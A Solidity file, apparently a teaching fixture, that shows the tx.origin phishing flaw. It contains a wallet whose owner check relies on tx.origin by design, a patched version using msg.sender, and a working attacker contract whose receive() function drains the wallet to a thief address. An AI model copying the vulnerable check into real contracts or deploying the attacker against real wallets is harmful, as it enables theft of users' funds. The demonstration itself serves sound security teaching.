// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract VulnerableTxOriginWallet {
    address public immutable OWNER;

    constructor(address walletOwner) payable {
        OWNER = walletOwner;
    }

    receive() external payable {}

    function _checkOwner() internal view virtual {
        require(tx.origin == OWNER, "not owner origin");
    }

    function transferAll(address payable recipient) external {
        _checkOwner();
        (bool success,) = recipient.call{value: address(this).balance}("");
        require(success, "transfer failed");
    }
}

contract PatchedWallet is VulnerableTxOriginWallet {

    constructor(address walletOwner) payable VulnerableTxOriginWallet(walletOwner) {}

    function _checkOwner() internal view override {
        require(msg.sender == OWNER, "not owner sender");
    }
}

contract TxOriginPhishingAttacker {
    VulnerableTxOriginWallet public immutable TARGET;
    address payable public immutable THIEF;

    constructor(address payable targetAddress, address payable thiefAddress) {
        TARGET = VulnerableTxOriginWallet(targetAddress);
        THIEF = thiefAddress;
    }

    receive() external payable {
        TARGET.transferAll(THIEF);
    }
}
